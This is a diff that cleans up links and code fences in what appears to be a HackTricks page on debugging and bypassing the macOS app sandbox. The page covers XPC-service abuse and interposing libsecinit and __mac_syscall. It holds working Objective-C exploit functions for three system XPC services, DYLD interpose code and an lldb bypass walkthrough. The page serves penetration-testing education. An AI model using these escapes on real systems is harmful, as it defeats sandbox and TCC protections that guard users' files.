@@ -1,12 +1,10 @@
 # macOS Sandbox Debug & Bypass
 
-
 ## Sandbox loading process
 
-![[../../../../../images/image (901).png|]]
+![](../../../../../images/image (901).png)
 
 *Image from <http://newosxbook.com/files/HITSB.pdf>*
-
 
 In the previous image it's possible to observe **how the sandbox will be loaded** when an application with the entitlement **`com.apple.security.app-sandbox`** is run.
 
@@ -21,7 +19,7 @@ Finally, the sandbox will be activated will a call to **`__sandbox_ms`** which w
 
 **Files created by sandboxed processes** are appended the **quarantine attribute** to prevent sandbox escaped. However, if you manage to **create an `.app` folder without the quarantine attribute** within a sandboxed application, you could make the app bundle binary point to **`/bin/bash`** and add some env variables in the **plist** to abuse **`open`** to **launch the new app unsandboxed**.
 
-This is what was done in [[https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html|**CVE-2023-32364**]]**.**
+This is what was done in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**
 
 > [!CAUTION]
 > Therefore, at the moment, if you are just capable of creating a folder with a name ending in **`.app`** without a quarantine attribute, you can scape the sandbox because macOS only **checks** the **quarantine** attribute in the **`.app` folder** and in the **main executable** (and we will point the main executable to **`/bin/bash`**).
@@ -30,14 +28,14 @@ This is what was done in [[https://gergelykalman.com/CVE-2023-32364-a-macOS-sand
 
 ### Abusing Open functionality
 
-In the [[macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv|**last examples of Word sandbox bypass**]] can be appreciated how the **`open`** cli functionality could be abused to bypass the sandbox.
+In the [**last examples of Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) can be appreciated how the **`open`** cli functionality could be abused to bypass the sandbox.
 
 [[macos-office-sandbox-bypasses.md]]
 
 ### Launch Agents/Daemons
 
 Even if an application is **meant to be sandboxed** (`com.apple.security.app-sandbox`), it's possible to make bypass the sandbox if it's **executed from a LaunchAgent** (`~/Library/LaunchAgents`) for example.\
-As explained in [[https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818|**this post**]], if you want to gain persistence with an application that is sandboxed you could make be automatically executed as a LaunchAgent and maybe inject malicious code via DyLib environment variables.
+As explained in [**this post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), if you want to gain persistence with an application that is sandboxed you could make be automatically executed as a LaunchAgent and maybe inject malicious code via DyLib environment variables.
 
 ### Abusing Auto Start Locations
 
@@ -59,7 +57,7 @@ If from then sandbox process you are able to **compromise other processes** runn
 
 The sandbox also allow to communicate with certain **Mach services** via XPC defined in the profile `application.sb`. If you are able to **abuse** one of these services you might be able to **escape the sandbox**.
 
-As indicated in [[https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/|this writeup]], the info about Mach services is stored in `/System/Library/xpc/launchd.plist`. It's possible to find all the System and User Mach services by searching inside that file for `<string>System</string>` and `<string>User</string>`.
+As indicated in [this writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), the info about Mach services is stored in `/System/Library/xpc/launchd.plist`. It's possible to find all the System and User Mach services by searching inside that file for `<string>System</string>` and `<string>User</string>`.
 
 Moreover, it's possible to check if a Mach service is available to a sandboxed application by calling the `bootstrap_look_up`:
 
@@ -85,17 +83,17 @@ void print_available_xpc(void) {
     }
 }
 ```
-```
+
 ### Available PID Mach services
 
-These Mach services were firstly abused to [[https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/|escape from the sandbox in this writeup]]. By that time, **all the XPC services required** by an application and its framework were visible in the app's PID domain (these are Mach Services with `ServiceType` as `Application`).
+These Mach services were firstly abused to [escape from the sandbox in this writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). By that time, **all the XPC services required** by an application and its framework were visible in the app's PID domain (these are Mach Services with `ServiceType` as `Application`).
 
 In order to **contact a PID Domain XPC service**, it's just needed to register it inside the app with a line such as:
 
 ```objectivec
 [[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
 ```
-```
+
 Moreover, It's possible to find all the **Application** Mach services by searching inside `System/Library/xpc/launchd.plist` for `<string>Application</string>`.
 
 Another way to find valid xpc services is to check the ones in:
@@ -104,8 +102,8 @@ Another way to find valid xpc services is to check the ones in:
 find /System/Library/Frameworks -name "*.xpc"
 find /System/Library/PrivateFrameworks -name "*.xpc"
 ```
-```
-Several examples abusing this technique can be found in the [[https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/|**original writeup**]], however, the following are some sumarized examples.
+
+Several examples abusing this technique can be found in the [**original writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), however, the following are some sumarized examples.
 
 #### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
 
@@ -131,7 +129,7 @@ void exploit_storagekitfsrunner(void) {
     }];
 }
 ```
-```
+
 #### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
 
 This XPC service allowed every client bu always returning YES and the method `createZipAtPath:hourThreshold:withReply:` basically allowed to indicate the path to a folder to compress and it'll compress it in a ZIP file.
@@ -176,7 +174,7 @@ void exploit_AudioAnalyticsHelperService(void) {
     }];
 }
 ```
-```
+
 #### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
 
 This XPC service allows to give read and write access to an arbitarry URL to the XPC client via the method `extendAccessToURL:completion:` which accepted any connection. As the XPC service has FDA, it's possible to abuse these permissions to bypass TCC completely.
@@ -210,10 +208,10 @@ void expoit_ShortcutsFileAccessHelper(NSString *target) {
     }];
 }
 ```
-```
+
 ### Static Compiling & Dynamically linking
 
-[[https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/|**This research**]] discovered 2 ways to bypass the Sandbox. Because the sandbox is applied from userland when the **libSystem** library is loaded. If a binary could avoid loading it, it would never get sandboxed:
+[**This research**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) discovered 2 ways to bypass the Sandbox. Because the sandbox is applied from userland when the **libSystem** library is loaded. If a binary could avoid loading it, it would never get sandboxed:
 
 - If the binary was **completely statically compiled**, it could avoid loading that library.
 - If the **binary wouldn't need to load any libraries** (because the linker is also in libSystem), it won't need to load libSystem.
@@ -226,17 +224,17 @@ Note that **even shellcodes** in ARM64 needs to be linked in `libSystem.dylib`:
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
-```
+
 ### Not inherited restrictions
 
-As explined in the **[[https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/|bonus of this writeup]]** a sandbox restriction like:
+As explined in the **[bonus of this writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** a sandbox restriction like:
 
 ```
 (version 1)
 (allow default)
 (deny file-write* (literal "/private/tmp/sbx"))
 ```
-```
+
 can be bypassed by a new process executing for example:
 
 ```bash
@@ -245,7 +243,7 @@ echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
 chmod +x /tmp/poc.app/Contents/MacOS/poc
 open /tmp/poc.app
 ```
-```
+
 However, of course, this new process won't inherit entitlements or privileges from the parent process.
 
 ### Entitlements
@@ -261,7 +259,7 @@ Note that even if some **actions** might be **allowed by at he sandbox** if an a
              (global-name "com.apple.cfnetwork.cfnetworkagent")
              [...]
 ```
-```
+
 ### Interposting Bypass
 
 For more information about **Interposting** check:
@@ -287,13 +285,13 @@ __attribute__((used, section("__DATA,__interpose"))) static struct {
 }
 _libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
 ```
-```
+
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
-```
+
 #### Interpost `__mac_syscall` to prevent the Sandbox
 
 ```c:interpose.c
@@ -327,7 +325,7 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
     { (const void *)my_mac_syscall, (const void *)__mac_syscall },
 };
 ```
-```
+
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -339,7 +337,7 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
-```
+
 ### Debug & bypass Sandbox with lldb
 
 Let's compile an application that should be sandboxed:
@@ -352,18 +350,16 @@ int main() {
     system("cat ~/Desktop/del.txt");
 }
 ```
-```
 
 **entitlements.xml**
 
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
 <dict>
-com.apple.security.app\-sandbox
-
+<key>com.apple.security.app-sandbox</key>
+<true/>
 </dict>
 </plist>
-```
 ```
 
 **Info.plist**
@@ -371,15 +367,13 @@ com.apple.security.app\-sandbox
 ```xml
 <plist version="1.0">
 <dict>
-    CFBundleIdentifier
-    xyz.hacktricks.sandbox
-    CFBundleName
-    Sandbox
+    <key>CFBundleIdentifier</key>
+    <string>xyz.hacktricks.sandbox</string>
+    <key>CFBundleName</key>
+    <string>Sandbox</string>
 </dict>
 </plist>
 ```
-```
-
 
 Then compile the app:
 
@@ -392,7 +386,7 @@ gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.pli
 # Apply the entitlements via signing
 codesign -s <cert-name> --entitlements entitlements.xml sand
 ```
-```
+
 > [!CAUTION]
 > The app will try to **read** the file **`~/Desktop/del.txt`**, which the **Sandbox won't allow**.\
 > Create a file in there as once the Sandbox is bypassed, it will be able to read it:
@@ -479,14 +473,12 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
-```
+
 > [!WARNING] > **Even with the Sandbox bypassed TCC** will ask the user if he wants to allow the process to read files from desktop
 
 ## References
 
-- [[http://newosxbook.com/files/HITSB.pdf|http://newosxbook.com/files/HITSB.pdf]]
-- [[https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/|https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/]]
-- [[https://www.youtube.com/watch?v=mG715HcDgO8|https://www.youtube.com/watch?v=mG715HcDgO8]]
-
-
+- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
+- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
+- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)
 
